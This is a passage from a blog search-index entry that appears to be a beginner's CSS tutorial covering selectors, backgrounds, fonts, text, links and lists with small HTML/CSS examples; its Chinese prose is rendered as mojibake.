50px;&#125;</code></pre></div><p>åœ¨å¹³çº§çš„pæ‰å¯ä»¥ç”Ÿæ•ˆï¼Œå¯¹æ¯”ä»¥ä¸Šï¼Œä¹Ÿå°±æ˜¯p1æ˜¯æœ‰cssæ•ˆæœã€‚</p><h2 id="å±æ€§é€‰æ‹©å™¨"><a href="#å±æ€§é€‰æ‹©å™¨" class="headerlink" title="å±æ€§é€‰æ‹©å™¨"></a>å±æ€§é€‰æ‹©å™¨</h2><div class="hljs"><pre><code class="hljs html">p[title=cc]&#123;background: green;color: red;font-size: 50px;&#125;</code></pre></div><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span> div1<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>div2<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>p2<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"cc"</span>&gt;</span>p3<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"cc 1"</span>&gt;</span>p1<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></code></pre></div><p>åŸºæœ¬æ ‡ç­¾==+==</p><ul><li><p>[å±æ€§=å€¼]ï¼šp3å‡ºç°cssæ•ˆæœã€‚</p></li><li><p>[å±æ€§~=å€¼]ï¼šp1 p3å‡ºç°cssæ•ˆæœã€‚  æ³¨æ„ï¼šä»£ç ä¸­<code>cc 1</code>éœ€è¦ç©ºæ ¼éš”å¼€ï¼Œä¸éš”æ²¡æœ‰æ•ˆæœã€‚</p></li><li><p>[å±æ€§^=å€¼]ï¼šå¼€å¤´æœ‰ccçš„å­—ç¬¦å°±è¡Œ<code>cc1</code>. p1 p3 å‡ºç°ccæ•ˆæœã€‚</p></li><li><p>[å±æ€§$=å€¼]ï¼šç±»æ¯”<code>^=</code>  æ˜¯ç»“æŸã€‚</p></li></ul><h2 id="ä¼ªå…ƒç´ é€‰æ‹©å™¨"><a href="#ä¼ªå…ƒç´ é€‰æ‹©å™¨" class="headerlink" title="ä¼ªå…ƒç´ é€‰æ‹©å™¨"></a>ä¼ªå…ƒç´ é€‰æ‹©å™¨</h2><p>æ¯ä¸ªæˆ‘è‡ªå·±å†™å‡ºæ¥çš„å…ƒç´ éƒ½ä¼šæœ‰ä¼ªå…ƒç´ ã€‚ã€</p><p>ä¾‹ï¼š</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"cc"</span>&gt;</span> <span class="hljs-comment">&lt;!--&lt;before&gt; --&gt;</span>  ppp  <span class="hljs-comment">&lt;!--&lt;after&gt; --&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre></div><p>ç›´æ¥ä¸Šä»£ç ï¼š</p><div class="hljs"><pre><code class="hljs html">p::before&#123;content: "before"    &#125;p::after&#123;content: "after"&#125;</code></pre></div><p>æ•ˆæœï¼š</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css4.jpg?raw=true" srcset="/img/loading.gif" alt></p><p><strong>å—å…ƒç´ ï¼š</strong></p><p>ç¬¬ä¸€ä¸ªå­—æ¯ï¼š<code>first-letter</code></p><p>ç¬¬ä¸€è¡Œï¼š<code>first-line</code></p><div class="hljs"><pre><code class="hljs html">p::first-letter&#123;color: red;font-size: 100px;&#125;</code></pre></div><p>è¿™äº›å†™å°±æ˜¯ä¼šæ˜¯på†…å†…å®¹ç¬¬ä¸€ä¸ª<strong>å­—ç¬¦</strong>å¤§å†™ã€‚</p><p>ä¹Ÿå¯ä»¥ä¸º</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"cc"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">first-letter</span>&gt;</span>t<span class="hljs-tag">&lt;/<span class="hljs-name">first-letter</span>&gt;</span>he way i am ;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre></div><h2 id="CSS-èƒŒæ™¯"><a href="#CSS-èƒŒæ™¯" class="headerlink" title="CSS èƒŒæ™¯"></a>CSS èƒŒæ™¯</h2><p>CSS èƒŒæ™¯å±æ€§ç”¨äºå®šä¹‰HTMLå…ƒç´ çš„èƒŒæ™¯ã€‚</p><h4 id="èƒŒæ™¯é¢œè‰²"><a href="#èƒŒæ™¯é¢œè‰²" class="headerlink" title="èƒŒæ™¯é¢œè‰²"></a>èƒŒæ™¯é¢œè‰²</h4><p><code>background-color</code> å±æ€§å®šä¹‰äº†å…ƒç´ çš„èƒŒæ™¯é¢œè‰².</p><p>é¡µé¢çš„èƒŒæ™¯é¢œè‰²ä½¿ç”¨åœ¨bodyçš„é€‰æ‹©å™¨ä¸­:</p><p><code>body {background-color:red;}</code></p><h4 id="èƒŒæ™¯å›¾åƒ"><a href="#èƒŒæ™¯å›¾åƒ" class="headerlink" title="èƒŒæ™¯å›¾åƒ"></a>èƒŒæ™¯å›¾åƒ</h4><p><code>background-image</code>å±æ€§æè¿°äº†å…ƒç´ çš„èƒŒæ™¯å›¾åƒ.</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒèƒŒæ™¯å›¾åƒè¿›è¡Œ<strong>å¹³é“ºé‡å¤</strong>æ˜¾ç¤º.</p><p><code>body {background-image:url(&#39;1.png&#39;);}</code></p><h4 id="èƒŒæ™¯å›¾åƒ-ç›¸å…³è®¾ç½®"><a href="#èƒŒæ™¯å›¾åƒ-ç›¸å…³è®¾ç½®" class="headerlink" title="èƒŒæ™¯å›¾åƒ - ç›¸å…³è®¾ç½®"></a>èƒŒæ™¯å›¾åƒ - ç›¸å…³è®¾ç½®</h4><ul><li><strong>æ°´å¹³æˆ–å‚ç›´å¹³é“º</strong>ï¼š</li></ul><div class="hljs"><pre><code class="hljs html">body&#123;background-image:url('gradient2.png');background-repeat:repeat-x;&#125;</code></pre></div><p>  é‡Œé¢repeat-xæ˜¯xè½´ï¼Œrepeat-yæ˜¯yè½´ã€‚</p><ul><li><strong>ä¸å¹³é“ºï¼š</strong><code>background-repeat:no-repeat</code></li><li><strong>å®šä½ï¼š</strong></li></ul><p>â€‹      <code>background-position:50% 0%</code> è¿™ä½¿å…¶åœ¨xè½´çš„ä¸­å¿ƒï¼Œ</p><p>â€‹        xï¼š left center rightï¼›</p><p>â€‹        y:  top center bottomï¼›</p><h2 id="csså­—ä½“"><a href="#csså­—ä½“" class="headerlink" title="csså­—ä½“"></a>csså­—ä½“</h2><h4 id="csså­—ä½“-1"><a href="#csså­—ä½“-1" class="headerlink" title="csså­—ä½“"></a>csså­—ä½“</h4><ul><li><p><strong>å­—ä½“ç³»åˆ—</strong>ï¼šfont-family å±æ€§è®¾ç½®æ–‡æœ¬çš„å­—ä½“ç³»åˆ—ï¼Œåº”è¯¥è®¾ç½®å‡ ä¸ªå­—ä½“åç§°ä½œä¸ºä¸€ç§â€åå¤‡â€æœºåˆ¶ã€‚</p><p>ä¾‹ï¼š<code>font-family:&quot;é»‘ä½“&quot;, &quot;å®‹ä½“&quot;,&quot;å¾®è½¯é»‘é›…&quot;;</code></p></li><li><p><strong>å­—ä½“æ ·å¼</strong>:<code>font-style:italic;</code>æ–œä½“</p></li><li><p><strong>å­—ä½“å¤§å°</strong>ï¼šfont-size å±æ€§è®¾ç½®æ–‡æœ¬çš„å¤§å°ã€‚<code>font-size:40px;</code> font-weight: è®¾ç½®å…¶ç²—ç»†ã€‚font-weight:</p><p>normal lighter blod;</p></li></ul><p>ç»ƒä¹ ï¼š</p><div class="hljs"><pre><code class="hljs html">body &#123;font-family: "é»‘ä½“","å®‹ä½“";font-style:italic;font-size:80px;font-weight: bold;&#125;  /*5.css */</code></pre></div><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ–‡å­—-å­—ä½“<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"5.css"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>è¿™æ˜¯ä¸€æ®µå­—<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>hello world!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><h2 id="CSS-æ–‡æœ¬"><a href="#CSS-æ–‡æœ¬" class="headerlink" title="CSS - æ–‡æœ¬"></a>CSS - æ–‡æœ¬</h2><h4 id="æ–‡æœ¬å±æ€§é›†åˆ"><a href="#æ–‡æœ¬å±æ€§é›†åˆ" class="headerlink" title="æ–‡æœ¬å±æ€§é›†åˆ"></a>æ–‡æœ¬å±æ€§é›†åˆ</h4><ul><li><strong>colorå±æ€§ç”¨äºè®¾ç½®æ–‡æœ¬çš„é¢œè‰²</strong></li><li><strong>directionå±æ€§ç”¨äºè®¾ç½®æ–‡æœ¬æ–¹å‘ã€‚</strong></li><li><strong>letter-spacingå±æ€§ç”¨äºåœ¨ç»„æˆå•è¯çš„å­—æ¯ä¹‹é—´æ·»åŠ æˆ–å‡å»ç©ºæ ¼ã€‚</strong> </li><li><strong>text-indentå±æ€§ç”¨äºç¼©è¿›æ®µè½çš„æ–‡æœ¬ã€‚</strong></li><li><strong>text-alignå±æ€§ç”¨äºå¯¹é½æ–‡æ¡£çš„æ–‡æœ¬ã€‚</strong> </li><li><strong>text-decorationå±æ€§ç”¨äºä¸‹åˆ’çº¿ï¼Œä¸Šåˆ’çº¿å’Œåˆ é™¤æ–‡æœ¬ã€‚</strong></li><li><strong>text-transformå±æ€§ç”¨äºå¤§å†™æ–‡æœ¬æˆ–å°†æ–‡æœ¬è½¬æ¢ä¸ºå¤§å†™æˆ–å°å†™å­—æ¯ã€‚</strong></li><li><strong>white-spaceå±æ€§ç”¨äºæ§åˆ¶æ–‡æœ¬çš„æµå’Œæ ¼å¼ã€‚</strong></li><li><strong>text-shadowå±æ€§ç”¨äºè®¾ç½®æ–‡æœ¬å‘¨å›´çš„æ–‡æœ¬é˜´å½±ã€‚</strong></li></ul><h4 id="æ–‡æœ¬é¢œè‰²ï¼š"><a href="#æ–‡æœ¬é¢œè‰²ï¼š" class="headerlink" title="æ–‡æœ¬é¢œè‰²ï¼š"></a>æ–‡æœ¬é¢œè‰²ï¼š</h4><ul><li>åå…­è¿›åˆ¶å€¼ - å¦‚: <strong>ï¼ƒFF0000</strong></li><li>ä¸€ä¸ªRGBå€¼ - å¦‚: <strong>RGB(255,0,0)</strong>     ==ä¸æ¨èä½¿ç”¨å¤ªå¤šæµè§ˆå™¨ä¸æ”¯æŒ==</li><li>é¢œè‰²çš„åç§° - å¦‚: <strong>red</strong></li></ul><div class="hljs"><pre><code class="hljs html">body &#123;color:red;&#125;h1 &#123;color:#00ff00;&#125;h2 &#123;color:rgb(255,0,0);&#125;</code></pre></div><h4 id="æ–‡æœ¬çš„å¯¹é½æ–¹å¼"><a href="#æ–‡æœ¬çš„å¯¹é½æ–¹å¼" class="headerlink" title="æ–‡æœ¬çš„å¯¹é½æ–¹å¼"></a>æ–‡æœ¬çš„å¯¹é½æ–¹å¼</h4><p>æ–‡æœ¬å¯å±…ä¸­æˆ–å¯¹é½åˆ°å·¦æˆ–å³,ä¸¤ç«¯å¯¹é½.</p><div class="hljs"><pre><code class="hljs html">.a1&#123;text-align:right;&#125;.a2&#123;text-align:center;&#125;.a3&#123;text-align:left;&#125;</code></pre></div><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"a1"</span>&gt;</span>è¿™æ˜¯ä¸€æ®µå­—<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"a2"</span>&gt;</span>hello world!<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"a3"</span>&gt;</span>hhhhaaaa<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></code></pre></div><h4 id="æ–‡æœ¬ä¿®é¥°"><a href="#æ–‡æœ¬ä¿®é¥°" class="headerlink" title="æ–‡æœ¬ä¿®é¥°"></a>æ–‡æœ¬ä¿®é¥°</h4><p>è£…é¥°æ–‡å­—ï¼Œå€¼ä¸ºnoneï¼ˆå»æ‰ä¿®é¥°ï¼‰ï¼Œunderlineï¼Œoverlineï¼Œline-throughï¼Œblinkã€‚</p><div class="hljs"><pre><code class="hljs html">.a1&#123;text-decoration:overline;&#125;.a2&#123;text-decoration:line-through;&#125;.a3&#123;text-decoration:underline;&#125;</code></pre></div><h4 id="æ–‡æœ¬ç¼©è¿›"><a href="#æ–‡æœ¬ç¼©è¿›" class="headerlink" title="æ–‡æœ¬ç¼©è¿›"></a>æ–‡æœ¬ç¼©è¿›</h4><p>æ–‡æœ¬ç¼©è¿›å±æ€§æ˜¯ç”¨æ¥æŒ‡å®šæ–‡æœ¬çš„ç¬¬ä¸€è¡Œçš„ç¼©è¿›ã€‚</p><p><code>p {text-indent:50px;}</code></p><h4 id="æ–‡æœ¬æ–¹å‘"><a href="#æ–‡æœ¬æ–¹å‘" class="headerlink" title="æ–‡æœ¬æ–¹å‘"></a>æ–‡æœ¬æ–¹å‘</h4><p>å€¼æ˜¯ltræˆ–rtlã€‚</p><div class="hljs"><pre><code class="hljs html">.a&#123;  direction:rtl;   &#125;</code></pre></div><p>æ–‡å­—å°±å…ˆå†™åˆ°è¿™ã€‚</p><h2 id="CSS-é“¾æ¥"><a href="#CSS-é“¾æ¥" class="headerlink" title="CSS é“¾æ¥"></a>CSS é“¾æ¥</h2><h4 id="é“¾æ¥æ ·å¼"><a href="#é“¾æ¥æ ·å¼" class="headerlink" title="é“¾æ¥æ ·å¼"></a>é“¾æ¥æ ·å¼</h4><ol><li><strong>a:link - æ­£å¸¸ï¼Œæœªè®¿é—®è¿‡çš„é“¾æ¥</strong></li><li><strong>a:visited - ç”¨æˆ·å·²è®¿é—®è¿‡çš„é“¾æ¥</strong></li><li><strong>a:hover - å½“ç”¨æˆ·é¼ æ ‡æ”¾åœ¨é“¾æ¥ä¸Šæ—¶</strong></li><li><strong>a:active - é“¾æ¥è¢«ç‚¹å‡»çš„é‚£ä¸€åˆ»</strong></li></ol><p><code>a:link {color: red;}</code></p><h2 id="CSSåˆ—è¡¨"><a href="#CSSåˆ—è¡¨" class="headerlink" title="CSSåˆ—è¡¨"></a>CSSåˆ—è¡¨</h2><p>å¸¸ç”¨çš„å°±æ˜¯</p><div class="hljs"><pre><code class="hljs html">ul&#123;    list-style-type: none;      list-style-type: disc;    å®å¿ƒåœ†    list-style-type: circle;    ç©ºå¿ƒåœ†    list-style-type: square;      å®å¿ƒæ–¹æ ¼&#125;</code></pre></div><p>æœ€å¸¸ç”¨å°±æ˜¯ none ç„¶åæ¢æˆè‡ªå·±æƒ³å¼„æˆçš„å›¾ç‰‡ã€‚</p><p> ol å¯¹åº”å°±æ˜¯ <code>lower-alpha</code>  <code>upper-alpha</code> <code>lower-roman</code>ç­‰ç­‰ï¼›</p><p><strong>ä½œä¸ºåˆ—è¡¨é¡¹æ ‡è®°çš„å›¾åƒ</strong></p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-string">ul</span>&#123;    <span class="hljs-built_in">list-style-image:</span> <span class="hljs-string">url(</span><span class="hljs-string">''</span>);&#125;</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>css</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
